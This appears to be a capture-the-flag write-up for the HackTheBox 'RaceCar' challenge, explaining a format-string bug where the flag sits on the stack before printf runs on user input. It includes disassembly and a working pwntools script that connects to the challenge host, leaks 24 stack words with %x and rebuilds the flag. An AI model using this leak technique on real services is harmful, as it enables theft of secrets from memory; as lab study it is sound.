---
layout: post
title: "RaceCar (HTB pwn)"
subtitle: "every mitigation on, but the win screen runs printf on my raw input"
date: 2023-04-08
tags: [htb, pwn, format-string, info-leak]
category: writeups
kind: challenge
os: Linux
tldr: "Full RELRO, stack canary, NX and PIE are all on. It does not matter, because the victory path reads flag.txt into a stack buffer and then calls printf on my unfiltered input. A row of %x conversions walks the stack and the leaked words reassemble into the flag. No %n write needed."
---

## the binary

RaceCar is a 32-bit Linux pwn challenge with a remote instance. One ELF, not stripped:

```text
racecar: ELF 32-bit LSB pie executable, Intel i386, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-linux.so.2, ... not stripped
```

Every mitigation is turned on:

```text
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
Stripped: No
```

That readout usually means the easy wins are closed. Full RELRO makes the GOT read-only, so the classic GOT overwrite is out. The canary guards the saved return address. NX stops shellcode on the stack. PIE randomizes the base, so no address is fixed. None of it mattered, because the interesting function hands my input straight to `printf`.

## the bug

The program is a toy racing game. You enter a name and nickname, pick a menu option, pick a car and a race, and the race resolves to a win or a loss. The win branch lives in `car_menu`, and it is where everything goes wrong. Read as pseudo-C:

```c
// inside car_menu, taken only when you win the race
buf = malloc(0x171);
fp  = fopen("flag.txt", "r");
if (fp == NULL) {
    printf("...[-] Could not open flag.txt. Please contact the creator.");
    exit(0x69);
}
fgets(flag, 0x2c, fp);   // flag read into a stack buffer
read(0, buf, 0x170);     // my input, read raw
puts("...The grand winner of the race wants the whole world to know this: ");
printf(buf);             // format string on my input
```

Two lines do the damage together. `fgets` reads the flag off disk into a 44-byte buffer that lives on `car_menu`'s stack frame. Then `printf(buf)` is called with my input as the format string, no fixed format in front of it. The matching disassembly shows the pair plainly:

```asm
     f71: call   6d0 <malloc@plt>     ; malloc(0x171) -> input buffer
     ...
     f8d: call   740 <fopen@plt>      ; fopen("flag.txt", "r")
     ...
     fc9: lea    eax,[ebp-0x38]       ; flag buffer, on the stack
     fcd: call   680 <fgets@plt>      ; fgets(flag, 0x2c, fp)
     ...
     fe2: call   660 <read@plt>       ; read(0, buf, 0x170) <- my input
     ...
    1002: call   670 <printf@plt>     ; printf(buf)  format string
```

This is the whole game. The flag is already sitting on the stack by the time my format string runs, so I do not need a single write primitive. A read is enough. The mitigations that would matter for a `%n` GOT overwrite or a ROP chain are irrelevant when the target is already loaded into the frame I am about to leak.

## the solve

The menu path to the vulnerable `printf` is: enter a name, enter a nickname, choose car selection from the top menu, pick a car, pick a race, win. The race outcome is decided by two `rand()` values compared against each other, so the result is not under my control and I replayed until the victory prompt showed up. My exploit drives that sequence and then sends the format string at the `big victory?` prompt:

```python
from pwn import *

# Connect to the service
conn = remote("167.71.138.110", 30479)

payload = input("Enter your payload: ")

# Interact with the service
conn.sendlineafter(b'Name', b'zed')
conn.sendlineafter(b'Nickname', b'zed')
conn.sendlineafter(b'selection', b'2')
conn.sendlineafter(b'car', b'2')  # Changed to '2' based on your initial question
conn.sendlineafter(b'Circuit', b'1')
conn.sendlineafter(b'victory?', bytes(payload * 24, encoding='utf-8'))
conn.recv()
output = conn.recv().decode('utf-8')
conn.close()

# Extract addresses from the output
addresses = output.strip().split()[-24:]

# Convert the addresses starting from the 12th one to strings
strings = ''.join([p32(int(addr, 16)).decode('ascii', errors='ignore') for addr in addresses[11:]])

# Print the strings
print(strings)
```

The payload is a single `%x` conversion typed at the prompt. The script repeats it 24 times, so `printf` prints 24 stack words back as hex. That row of words is the dump of `car_menu`'s frame from the call site upward.

The reassembly is the clever part. The first eleven leaked words are frame bytes that sit between the format argument and the flag buffer: the loop counter, the menu choices, and the heap pointers `car_menu` is holding. The flag bytes begin around the twelfth word, which is why the script slices `addresses[11:]`. Each leaked word is a little-endian dword, so `p32(int(addr, 16))` turns each hex value back into its four bytes in the original order, and joining them rebuilds the text that `fgets` wrote into `[ebp-0x38]`. ASCII decode with `errors='ignore'` drops any non-printable padding and leaves the flag string.

## the flag

Running the exploit with `%x` as the payload dumped the stack, and the slice from the twelfth word forward decoded straight into the flag that `fgets` had read off disk. The leak recovered it in one shot and I submitted it. No canary leak, no PIE defeat, no `%n` write entered into it. The flag was resident on the stack, and an uncontrolled `printf` is all it takes to read the stack.